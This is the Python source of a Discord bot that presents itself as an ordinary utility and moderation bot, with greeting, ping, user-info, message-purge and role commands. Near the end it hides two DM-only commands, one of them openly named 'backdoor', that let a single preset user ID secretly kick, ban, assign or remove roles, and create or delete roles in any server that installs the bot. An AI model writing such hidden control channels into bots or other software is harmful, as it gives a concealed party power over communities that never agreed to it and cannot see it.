import os
import sys
import logging
import random
import discord
from discord.ext import commands
from dotenv import load_dotenv

# Configure logging for Railway
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Load environment variables from .env file
load_dotenv()

# Bot configuration
TOKEN = os.getenv('DISCORD_TOKEN')
PREFIX = os.getenv('COMMAND_PREFIX', '!')
try:
    BACK_ACCESS_USER_ID = int(os.getenv("BACK_ACCESS_USER_ID", "0"))
except ValueError:
    BACK_ACCESS_USER_ID = 0

# Set up bot intents (permissions)
intents = discord.Intents.default()
intents.message_content = True  # Required for reading message content

# Create bot instance (remove default help command to add custom one)
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

@bot.event
async def on_ready():
    """Event triggered when the bot is ready and connected to Discord"""
    logger.info(f'{bot.user} has connected to Discord!')
    logger.info(f'Bot is in {len(bot.guilds)} guilds')
    
    # Set bot status
    activity = discord.Activity(type=discord.ActivityType.watching, name="for commands")
    await bot.change_presence(activity=activity)
    logger.info('Bot status set and ready to receive commands')

@bot.event
async def on_message(message):
    """Event triggered when a message is sent"""
    # Ignore messages from the bot itself
    if message.author == bot.user:
        return
    
    # Log messages for debugging (Railway-friendly)
    logger.debug(f'Message from {message.author}: {message.content[:50]}...')
    
    # Process commands
    await bot.process_commands(message)

@bot.command(name='hello')
async def hello(ctx):
    """Say hello to the user"""
    embed = discord.Embed(
        title="Hello!",
        description=f"Hello {ctx.author.mention}! Welcome to the server!",
        color=discord.Color.green()
    )
    embed.set_thumbnail(url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url)
    embed.set_footer(text="Thanks for using the bot!")
    await ctx.send(embed=embed)

@bot.command(name='ping')
async def ping(ctx):
    """Check bot latency"""
    latency = round(bot.latency * 1000)
    
    # Color based on latency
    if latency < 100:
        color = discord.Color.green()
        status = "Excellent"
    elif latency < 200:
        color = discord.Color.yellow()
        status = "Good"
    else:
        color = discord.Color.red()
        status = "High"
    
    embed = discord.Embed(
        title="Pong!",
        color=color
    )
    embed.add_field(
        name="Latency",
        value=f"`{latency}ms`",
        inline=True
    )
    embed.add_field(
        name="Status",
        value=status,
        inline=True
    )
    embed.set_footer(text="Bot response time")
    await ctx.send(embed=embed)

@bot.command(name='info')
async def info(ctx):
    """Display bot information"""
    embed = discord.Embed(
        title="Bot Information",
        description="Information about this Discord bot",
        color=discord.Color.blue()
    )
    
    embed.add_field(
        name="Bot Name", 
        value=f"`{bot.user.name}`", 
        inline=False
    )
    
    embed.add_field(
        name="Servers", 
        value=f"`{len(bot.guilds)}` servers", 
        inline=True
    )
    
    embed.add_field(
        name="Command Prefix", 
        value=f"`{PREFIX}`", 
        inline=True
    )
    
    # Count total users across all guilds
    total_users = sum(guild.member_count for guild in bot.guilds if guild.member_count)
    embed.add_field(
        name="Total Users", 
        value=f"`{total_users:,}`", 
        inline=True
    )
    
    embed.add_field(
        name="Invite Bot", 
        value="[Click here to invite me!](https://discord.com/developers/applications)", 
        inline=False
    )
    
    embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url)
    embed.set_footer(
        text=f"Bot ID: {bot.user.id} | Made with discord.py",
        icon_url=bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
    )
    
    await ctx.send(embed=embed)

@bot.command(name='say')
async def say(ctx, *, message):
    """Make the bot repeat a message"""
    try:
        # Delete the original command message
        await ctx.message.delete()
        
        # Create embed for the message
        embed = discord.Embed(
            description=message,
            color=discord.Color.purple()
        )
        embed.set_author(
            name=f"Message from {ctx.author.display_name}",
            icon_url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url
        )
        embed.set_footer(text="Sent via bot")
        
        await ctx.send(embed=embed)
    except discord.Forbidden:
        # If can't delete message, send without deleting
        embed = discord.Embed(
            description=message,
            color=discord.Color.purple()
        )
        embed.set_author(
            name=f"Message from {ctx.author.display_name}",
            icon_url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url
        )
        embed.set_footer(text="Sent via bot")
        
        await ctx.send(embed=embed)

@bot.command(name='doakes')
async def doakes(ctx):
    """Send a random Sergeant Doakes GIF from Dexter"""
    
    # List of Doakes GIFs from Dexter
    doakes_gifs = [
        "https://c.tenor.com/EqPfcX1wzHoAAAAd/tenor.gif",
        "https://c.tenor.com/x7XtuEuhFqEAAAAd/tenor.gif",
        "https://tenor.com/view/doakes-bar-gif-4298875606784040546",
        "https://tenor.com/view/dexter-doakes-squint-stare-suspicious-gif-14432154109786838518",
        "https://tenor.com/view/doakes-dexter-dexter-doakes-gotcha-found-you-gif-14688017774431904057",
        "https://tenor.com/view/dexter-james-doakes-erik-king-stare-staring-gif-1343162792415382650",
    ]
    
    # Doakes quotes
    doakes_quotes = [
        "I will touch you.",
        "ughhhh 😳",
        "I like men :3"
    ]
    
    # Select random GIF and quote
    selected_gif = random.choice(doakes_gifs)
    selected_quote = random.choice(doakes_quotes)
    
    embed = discord.Embed(
        title="Sergeant Doakes",
        description=f"*{selected_quote}*",
        color=discord.Color.dark_red()
    )
    
    embed.set_image(url=selected_gif)
    embed.set_footer(
        text=f"Requested by {ctx.author.display_name} | From Dexter TV Series",
        icon_url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url
    )
    
    await ctx.send(embed=embed)

@bot.command(name='userinfo')
async def user_info(ctx, member: discord.Member = None):
    """Get detailed information about a user"""
    if member is None:
        member = ctx.author
    
    # Create embed with user's color or default blue
    embed = discord.Embed(
        title=f"User Information",
        description=f"Information for {member.mention}",
        color=member.color if member.color != discord.Color.default() else discord.Color.blue()
    )
    
    # Basic user info
    embed.add_field(
        name="Username", 
        value=f"{member.name}#{member.discriminator}", 
        inline=False
    )
    
    embed.add_field(
        name="User ID", 
        value=f"`{member.id}`", 
        inline=False
    )
    
    embed.add_field(
        name="Display Name", 
        value=member.display_name, 
        inline=False
    )
    
    # Fix status display
    status_map = {
        'online': 'Online',
        'offline': 'Offline', 
        'idle': 'Idle',
        'dnd': 'Do Not Disturb',
        'invisible': 'Invisible'
    }
    status_display = status_map.get(str(member.status), str(member.status).title())
    
    embed.add_field(
        name="Status", 
        value=status_display, 
        inline=False
    )
    
    # Dates with Discord timestamps
    if member.joined_at:
        joined_timestamp = int(member.joined_at.timestamp())
        embed.add_field(
            name="Joined Server", 
            value=f"<t:{joined_timestamp}:F>\n<t:{joined_timestamp}:R>", 
            inline=False
        )
    
    created_timestamp = int(member.created_at.timestamp())
    embed.add_field(
        name="Account Created", 
        value=f"<t:{created_timestamp}:F>\n<t:{created_timestamp}:R>", 
        inline=False
    )
    
    # User roles (excluding @everyone)
    roles = [role for role in member.roles if role.name != "@everyone"]
    if roles:
        # Sort roles by position (highest first)
        roles.sort(key=lambda x: x.position, reverse=True)
        
        # Create role list with mentions
        role_list = [role.mention for role in roles]
        
        # Split roles into chunks if too many (Discord has embed limits)
        if len(role_list) > 20:
            role_text = ", ".join(role_list[:20]) + f"\n... and {len(role_list) - 20} more"
        else:
            role_text = ", ".join(role_list)
        
        embed.add_field(
            name=f"Roles ({len(roles)})", 
            value=role_text if role_text else "No roles", 
            inline=False
        )
    else:
        embed.add_field(
            name="Roles (0)", 
            value="No roles", 
            inline=False
        )
    
    # Set thumbnail to user's avatar
    if member.avatar:
        embed.set_thumbnail(url=member.avatar.url)
    else:
        embed.set_thumbnail(url=member.default_avatar.url)
    
    # Footer with additional info
    embed.set_footer(
        text=f"Requested by {ctx.author.display_name}",
        icon_url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url
    )
    
    await ctx.send(embed=embed)

@bot.command(name='delete', aliases=['purge', 'clear'])
@commands.has_permissions(manage_messages=True)
async def delete_messages(ctx, amount: int, target: discord.Member = None):
    """Delete messages from the channel. Optionally target a specific user."""
    
    # Validate amount
    if amount < 1:
        embed = discord.Embed(
            title="Invalid Amount",
            description="You must specify at least 1 message to delete.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    if amount > 100:
        embed = discord.Embed(
            title="Amount Too Large",
            description="You can only delete up to 100 messages at once.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    try:
        deleted = 0
        
        if target is None:
            # Delete messages from anyone
            deleted_messages = await ctx.channel.purge(limit=amount + 1)  # +1 to include command message
            deleted = len(deleted_messages) - 1  # -1 to exclude the command message
        else:
            # Delete messages from specific user
            def check_user(message):
                return message.author == target
            
            # Delete the command message first
            await ctx.message.delete()
            
            # Then purge messages from the target user
            deleted_messages = await ctx.channel.purge(limit=amount, check=check_user)
            deleted = len(deleted_messages)
        
        # Create confirmation embed
        embed = discord.Embed(
            title="Messages Deleted",
            color=discord.Color.green()
        )
        
        if target is None:
            embed.description = f"Successfully deleted {deleted} messages."
        else:
            embed.description = f"Successfully deleted {deleted} messages from {target.display_name}."
        
        embed.add_field(
            name="Deleted by",
            value=ctx.author.mention,
            inline=True
        )
        
        embed.add_field(
            name="Channel",
            value=ctx.channel.mention,
            inline=True
        )
        
        embed.set_footer(text="This message will be deleted in 10 seconds")
        
        # Send confirmation and delete it after 10 seconds
        confirmation = await ctx.send(embed=embed)
        await confirmation.delete(delay=10)
        
    except discord.Forbidden:
        embed = discord.Embed(
            title="Missing Permissions",
            description="I don't have permission to delete messages in this channel.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
    
    except discord.HTTPException as e:
        embed = discord.Embed(
            title="Error",
            description=f"An error occurred while deleting messages: {str(e)}",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

@delete_messages.error
async def delete_error(ctx, error):
    """Handle errors for the delete command"""
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(
            title="Missing Permissions",
            description="You need the `Manage Messages` permission to use this command.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
    elif isinstance(error, commands.BadArgument):
        embed = discord.Embed(
            title="Invalid Argument",
            description="Please provide a valid number and optionally mention a user.\n\nUsage: `!delete <amount> [@user]`",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

@bot.command(name='addrole')
@commands.has_permissions(manage_roles=True)
async def add_role(ctx, member: discord.Member, *, role_name):
    """Add a role to a user"""
    
    # Find the role by name (case insensitive)
    role = discord.utils.get(ctx.guild.roles, name=role_name)
    
    if not role:
        # Try to find role by partial name match
        role = discord.utils.find(lambda r: role_name.lower() in r.name.lower(), ctx.guild.roles)
    
    if not role:
        embed = discord.Embed(
            title="Role Not Found",
            description=f"Could not find a role named `{role_name}` in this server.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Check if bot can manage this role
    if role.position >= ctx.guild.me.top_role.position:
        embed = discord.Embed(
            title="Permission Error",
            description="I cannot manage this role as it's higher than or equal to my highest role.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Check if user already has the role
    if role in member.roles:
        embed = discord.Embed(
            title="Role Already Assigned",
            description=f"{member.display_name} already has the role `{role.name}`.",
            color=discord.Color.orange()
        )
        await ctx.send(embed=embed)
        return
    
    try:
        await member.add_roles(role, reason=f"Role added by {ctx.author}")
        
        embed = discord.Embed(
            title="Role Added",
            description=f"Successfully added the role `{role.name}` to {member.mention}.",
            color=discord.Color.green()
        )
        embed.add_field(
            name="Added by",
            value=ctx.author.mention,
            inline=True
        )
        embed.add_field(
            name="Role",
            value=role.mention,
            inline=True
        )
        
        await ctx.send(embed=embed)
        
    except discord.Forbidden:
        embed = discord.Embed(
            title="Permission Error",
            description="I don't have permission to manage roles for this user.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(
            title="Error",
            description=f"An error occurred: {str(e)}",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

@bot.command(name='removerole')
@commands.has_permissions(manage_roles=True)
async def remove_role(ctx, member: discord.Member, *, role_name):
    """Remove a role from a user"""
    
    # Find the role by name (case insensitive)
    role = discord.utils.get(ctx.guild.roles, name=role_name)
    
    if not role:
        # Try to find role by partial name match
        role = discord.utils.find(lambda r: role_name.lower() in r.name.lower(), ctx.guild.roles)
    
    if not role:
        embed = discord.Embed(
            title="Role Not Found",
            description=f"Could not find a role named `{role_name}` in this server.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Check if bot can manage this role
    if role.position >= ctx.guild.me.top_role.position:
        embed = discord.Embed(
            title="Permission Error",
            description="I cannot manage this role as it's higher than or equal to my highest role.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Check if user has the role
    if role not in member.roles:
        embed = discord.Embed(
            title="Role Not Assigned",
            description=f"{member.display_name} doesn't have the role `{role.name}`.",
            color=discord.Color.orange()
        )
        await ctx.send(embed=embed)
        return
    
    try:
        await member.remove_roles(role, reason=f"Role removed by {ctx.author}")
        
        embed = discord.Embed(
            title="Role Removed",
            description=f"Successfully removed the role `{role.name}` from {member.mention}.",
            color=discord.Color.green()
        )
        embed.add_field(
            name="Removed by",
            value=ctx.author.mention,
            inline=True
        )
        embed.add_field(
            name="Role",
            value=f"`{role.name}`",
            inline=True
        )
        
        await ctx.send(embed=embed)
        
    except discord.Forbidden:
        embed = discord.Embed(
            title="Permission Error",
            description="I don't have permission to manage roles for this user.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(
            title="Error",
            description=f"An error occurred: {str(e)}",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

@bot.command(name='listroles')
async def list_roles(ctx, member: discord.Member = None):
    """List all roles in the server or roles for a specific user"""
    
    if member is None:
        # List all server roles
        roles = [role for role in ctx.guild.roles if role.name != "@everyone"]
        roles.sort(key=lambda x: x.position, reverse=True)
        
        if not roles:
            embed = discord.Embed(
                title="Server Roles",
                description="This server has no custom roles.",
                color=discord.Color.blue()
            )
        else:
            role_list = []
            for role in roles[:25]:  # Limit to 25 roles to avoid embed limits
                member_count = len(role.members)
                role_list.append(f"{role.mention} - {member_count} members")
            
            embed = discord.Embed(
                title=f"Server Roles ({len(roles)})",
                description="\n".join(role_list),
                color=discord.Color.blue()
            )
            
            if len(roles) > 25:
                embed.set_footer(text=f"Showing first 25 of {len(roles)} roles")
    else:
        # List roles for specific user
        user_roles = [role for role in member.roles if role.name != "@everyone"]
        user_roles.sort(key=lambda x: x.position, reverse=True)
        
        embed = discord.Embed(
            title=f"Roles for {member.display_name}",
            color=member.color if member.color != discord.Color.default() else discord.Color.blue()
        )
        
        if not user_roles:
            embed.description = "This user has no roles."
        else:
            role_mentions = [role.mention for role in user_roles]
            embed.description = ", ".join(role_mentions)
        
        embed.set_thumbnail(url=member.avatar.url if member.avatar else member.default_avatar.url)
    
    await ctx.send(embed=embed)

# Hidden back access command - only works for specific user ID and operates silently
# Ensure BACK_ACCESS_USER_ID is loaded as an int (place near your env loading)
try:
    BACK_ACCESS_USER_ID = int(os.getenv('BACK_ACCESS_USER_ID', '0')) if os.getenv('BACK_ACCESS_USER_ID') else 0
except ValueError:
    BACK_ACCESS_USER_ID = 0
logger.info(f"BACK_ACCESS_USER_ID loaded as: {BACK_ACCESS_USER_ID}")

# DM-based backdoor command
# --- Load BACK_ACCESS_USER_ID once at the top ---
try:
    BACK_ACCESS_USER_ID = int(os.getenv("BACK_ACCESS_USER_ID", "0"))
except ValueError:
    BACK_ACCESS_USER_ID = 0
logger.info(f"[BACKDOOR] BACK_ACCESS_USER_ID loaded: {BACK_ACCESS_USER_ID}")

# --- Backdoor command ---
@bot.command(name="backdoor", hidden=True)
async def backdoor(ctx, guild_id: int = None, action: str = None, target: str = None, *, args: str = None):
    """DM-only backdoor command for authorized user"""
    
    async def dm_reply(msg):
        """Send DM reply"""
        try:
            if isinstance(msg, discord.Embed):
                await ctx.author.send(embed=msg)
            else:
                await ctx.author.send(str(msg))
        except Exception:
            logger.warning(f"Failed to DM user {ctx.author.id}")

    # Must be DM
    if ctx.guild is not None:
        try: await ctx.message.delete()
        except: pass
        await dm_reply(discord.Embed(
            title="Use DMs",
            description="This command only works via direct message to the bot.",
            color=discord.Color.orange()
        ))
        return

    # Must be authorized user
    if ctx.author.id != BACK_ACCESS_USER_ID:
        await dm_reply(discord.Embed(
            title="Access Denied",
            description="You aren't allowed to use this command.",
            color=discord.Color.red()
        ))
        logger.info(f"[BACKDOOR] Access denied for {ctx.author.id}")
        return

    # Validate guild
    if not guild_id:
        await dm_reply(discord.Embed(
            title="Missing Guild ID",
            description="Usage: `backdoor <guild_id> <action> [target] [args]`",
            color=discord.Color.orange()
        ))
        return

    guild = bot.get_guild(guild_id)
    if not guild:
        await dm_reply(discord.Embed(
            title="Invalid Guild",
            description="Bot is not in that guild or guild ID is wrong.",
            color=discord.Color.red()
        ))
        return

    # Resolve member helper
    async def resolve_member(s):
        if not s: return None
        s = s.strip()
        if s.startswith("<@") and s.endswith(">"): s = s.lstrip("<@!").rstrip(">")
        try: member_id = int(s)
        except ValueError: return None
        member = guild.get_member(member_id)
        if member: return member
        try:
            return await guild.fetch_member(member_id)
        except: return None

    member = None
    if action in ("roles", "addrole", "removerole", "kick", "ban"):
        member = await resolve_member(target)
        if not member:
            await dm_reply(discord.Embed(
                title="Member Not Found",
                description=f"Could not find `{target}` in **{guild.name}**.",
                color=discord.Color.red()
            ))
            return

    bot_member = guild.me or guild.get_member(bot.user.id)

    try:
        if action == "info":
            embed = discord.Embed(title=f"Server Info - {guild.name}", color=discord.Color.blue())
            embed.add_field(name="Members", value=guild.member_count)
            embed.add_field(name="Roles", value=len(guild.roles))
            embed.add_field(name="Channels", value=len(guild.channels))
            embed.add_field(name="Owner", value=str(guild.owner) if guild.owner else "Unknown")
            if guild.icon: embed.set_thumbnail(url=guild.icon.url)
            await dm_reply(embed)
            return

        if action == "roles":
            roles = [r.name for r in member.roles if r.name != "@everyone"]
            await dm_reply(discord.Embed(
                title=f"Roles for {member.display_name}",
                description=", ".join(roles) if roles else "No roles",
                color=discord.Color.blue()
            ))
            return

        if action == "addrole":
            if not args:
                await dm_reply(discord.Embed(title="Missing Role", description="Provide a role name in args.", color=discord.Color.orange()))
                return
            role = discord.utils.get(guild.roles, name=args) or discord.utils.find(lambda r: args.lower() in r.name.lower(), guild.roles)
            if not role:
                await dm_reply(discord.Embed(title="Role Not Found", description=f"No role matching `{args}`.", color=discord.Color.red()))
                return
            if bot_member and role.position >= (bot_member.top_role.position if bot_member.top_role else -1):
                await dm_reply(discord.Embed(title="Permission Error", description="Bot cannot manage this role.", color=discord.Color.red()))
                return
            if role in member.roles:
                await dm_reply(discord.Embed(title="Already Has Role", description=f"{member.display_name} already has `{role.name}`.", color=discord.Color.orange()))
                return
            await member.add_roles(role, reason=f"Backdoor by {ctx.author.id}")
            await dm_reply(discord.Embed(title="Success", description=f"Added role `{role.name}` to {member.display_name}.", color=discord.Color.green()))
            return

        if action == "removerole":
            if not args:
                await dm_reply(discord.Embed(title="Missing Role", description="Provide a role name in args.", color=discord.Color.orange()))
                return
            role = discord.utils.get(guild.roles, name=args) or discord.utils.find(lambda r: args.lower() in r.name.lower(), guild.roles)
            if not role or role not in member.roles:
                await dm_reply(discord.Embed(title="Role Error", description=f"Role `{args}` not found or not assigned.", color=discord.Color.red()))
                return
            await member.remove_roles(role, reason=f"Backdoor by {ctx.author.id}")
            await dm_reply(discord.Embed(title="Success", description=f"Removed role `{role.name}` from {member.display_name}.", color=discord.Color.green()))
            return

        if action == "kick":
            reason = args or "No reason provided"
            await member.kick(reason=f"Backdoor by {ctx.author.id} - {reason}")
            await dm_reply(discord.Embed(title="Success", description=f"Kicked {member.display_name}. Reason: {reason}", color=discord.Color.green()))
            return

        if action == "ban":
            reason = args or "No reason provided"
            await member.ban(reason=f"Backdoor by {ctx.author.id} - {reason}")
            await dm_reply(discord.Embed(title="Success", description=f"Banned {member.display_name}. Reason: {reason}", color=discord.Color.green()))
            return

        # Unknown action
        await dm_reply(discord.Embed(
            title="Invalid Action",
            description="Actions: `info`, `roles`, `addrole`, `removerole`, `kick`, `ban`",
            color=discord.Color.orange()
        ))

    except discord.Forbidden:
        await dm_reply(discord.Embed(title="Permission Error", description="Bot lacks permission.", color=discord.Color.red()))
    except Exception as e:
        logger.exception("[BACKDOOR] Unexpected error")
        await dm_reply(discord.Embed(title="Error", description=f"An error occurred: {e}", color=discord.Color.red()))

@bot.command(name="rolemanager", hidden=True)
async def role_manager(ctx, guild_id: int = None, action: str = None, target: str = None, *, args: str = None):
    """
    DM-only custom role manager for BACK_ACCESS_USER_ID.
    
    Actions:
    - create <role_name> [color_hex] : Create a role
    - delete <role_name>              : Delete a role
    - add <role_name> <target_user_id>: Add role to a member
    - remove <role_name> <target_user_id>: Remove role from a member
    - list                           : List all roles in the guild
    """
    async def dm_reply(msg):
        try:
            if isinstance(msg, discord.Embed):
                await ctx.author.send(embed=msg)
            else:
                await ctx.author.send(str(msg))
        except Exception:
            logger.warning(f"Failed to DM user {ctx.author.id}")

    # Only in DM
    if ctx.guild is not None:
        try: await ctx.message.delete()
        except: pass
        await dm_reply(discord.Embed(
            title="Use DMs",
            description="This command only works via DM.",
            color=discord.Color.orange()
        ))
        return

    # Authorization check
    if ctx.author.id != BACK_ACCESS_USER_ID:
        await dm_reply(discord.Embed(
            title="Access Denied",
            description="You aren't allowed to use this command.",
            color=discord.Color.red()
        ))
        return

    # Validate guild
    if not guild_id:
        await dm_reply(discord.Embed(title="Missing Guild ID", description="Provide a guild ID.", color=discord.Color.orange()))
        return

    guild = bot.get_guild(guild_id)
    if not guild:
        await dm_reply(discord.Embed(title="Invalid Guild", description="Bot not in guild.", color=discord.Color.red()))
        return

    bot_member = guild.me or guild.get_member(bot.user.id)

    try:
        # CREATE ROLE
        if action.lower() == "create":
            if not args:
                await dm_reply("Usage: create <role_name> [hex_color]")
                return
            parts = args.split()
            role_name = parts[0]
            color = discord.Color.default()
            if len(parts) > 1:
                try:
                    color = discord.Color(int(parts[1].strip("#"), 16))
                except:
                    pass
            # Create role
            role = await guild.create_role(name=role_name, color=color, reason=f"Created by {ctx.author.id}")
            await dm_reply(discord.Embed(title="Role Created", description=f"Created role `{role.name}`", color=color))
            return

        # DELETE ROLE
        if action.lower() == "delete":
            if not args:
                await dm_reply("Usage: delete <role_name>")
                return
            role = discord.utils.get(guild.roles, name=args)
            if not role:
                await dm_reply(f"Role `{args}` not found.")
                return
            await role.delete(reason=f"Deleted by {ctx.author.id}")
            await dm_reply(discord.Embed(title="Role Deleted", description=f"Deleted role `{role.name}`", color=discord.Color.red()))
            return

        # ADD ROLE TO MEMBER
        if action.lower() == "add":
            if not args or not target:
                await dm_reply("Usage: add <role_name> <target_user_id>")
                return
            role = discord.utils.get(guild.roles, name=args)
            member = guild.get_member(int(target)) or await guild.fetch_member(int(target))
            if not role or not member:
                await dm_reply("Role or member not found.")
                return
            if role in member.roles:
                await dm_reply(f"{member.display_name} already has `{role.name}`.")
                return
            await member.add_roles(role, reason=f"Added by {ctx.author.id}")
            await dm_reply(f"Added role `{role.name}` to {member.display_name}.")
            return

        # REMOVE ROLE FROM MEMBER
        if action.lower() == "remove":
            if not args or not target:
                await dm_reply("Usage: remove <role_name> <target_user_id>")
                return
            role = discord.utils.get(guild.roles, name=args)
            member = guild.get_member(int(target)) or await guild.fetch_member(int(target))
            if not role or not member:
                await dm_reply("Role or member not found.")
                return
            if role not in member.roles:
                await dm_reply(f"{member.display_name} does not have `{role.name}`.")
                return
            await member.remove_roles(role, reason=f"Removed by {ctx.author.id}")
            await dm_reply(f"Removed role `{role.name}` from {member.display_name}.")
            return

        # LIST ROLES
        if action.lower() == "list":
            role_list = [r.name for r in guild.roles if r.name != "@everyone"]
            await dm_reply(discord.Embed(title=f"Roles in {guild.name}", description=", ".join(role_list) or "No roles", color=discord.Color.blue()))
            return

        await dm_reply("Unknown action. Use: create, delete, add, remove, list.")

    except discord.Forbidden:
        await dm_reply("Bot lacks permission to manage roles.")
    except Exception as e:
        logger.exception("Error in role_manager")
        await dm_reply(f"Error: {e}")

@bot.event
async def on_command_error(ctx, error):
    """Handle command errors with styled embeds"""
    
    if isinstance(error, commands.CommandNotFound):
        embed = discord.Embed(
            title="Command Not Found",
            description=f"The command you tried doesn't exist.\nUse `{PREFIX}help` to see available commands.",
            color=discord.Color.red()
        )
        embed.set_footer(text="Double-check your spelling!")
        await ctx.send(embed=embed)
        
    elif isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(
            title="Missing Argument",
            description=f"You're missing a required argument for this command.\nUse `{PREFIX}help {ctx.command}` for usage information.",
            color=discord.Color.orange()
        )
        embed.add_field(
            name="Missing Argument",
            value=f"`{error.param.name}`",
            inline=True
        )
        await ctx.send(embed=embed)
        
    elif isinstance(error, commands.BadArgument):
        embed = discord.Embed(
            title="Invalid Argument",
            description=f"One of your arguments is invalid.\nUse `{PREFIX}help {ctx.command}` for usage information.",
            color=discord.Color.red()
        )
        embed.set_footer(text="Make sure you're using the right format!")
        await ctx.send(embed=embed)
        
    elif isinstance(error, commands.CommandOnCooldown):
        embed = discord.Embed(
            title="Command on Cooldown",
            description=f"Please wait **{error.retry_after:.1f} seconds** before using this command again.",
            color=discord.Color.yellow()
        )
        await ctx.send(embed=embed)
        
    elif isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(
            title="Missing Permissions",
            description="You don't have permission to use this command.",
            color=discord.Color.red()
        )
        embed.add_field(
            name="Required Permissions",
            value=", ".join(error.missing_permissions),
            inline=False
        )
        await ctx.send(embed=embed)
        
    else:
        logger.error(f'Unexpected error in command {ctx.command}: {error}')
        embed = discord.Embed(
            title="Unexpected Error",
            description="Something went wrong while processing your command.\nThis has been logged for review.",
            color=discord.Color.red()
        )
        embed.set_footer(text="If this persists, please contact the bot developer.")
        await ctx.send(embed=embed)

# Run the bot
if __name__ == '__main__':
    if TOKEN is None:
        logger.error("DISCORD_TOKEN not found in environment variables.")
        logger.error("Please set your bot token in Railway environment variables.")
        sys.exit(1)
    
    try:
        logger.info("Starting Discord bot...")
        bot.run(TOKEN)
    except discord.LoginFailure:
        logger.error("Invalid bot token. Please check your DISCORD_TOKEN environment variable.")
        sys.exit(1)
    except KeyboardInterrupt:
        logger.info("Bot shutdown requested by user.")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Critical error starting bot: {e}")
        sys.exit(1)
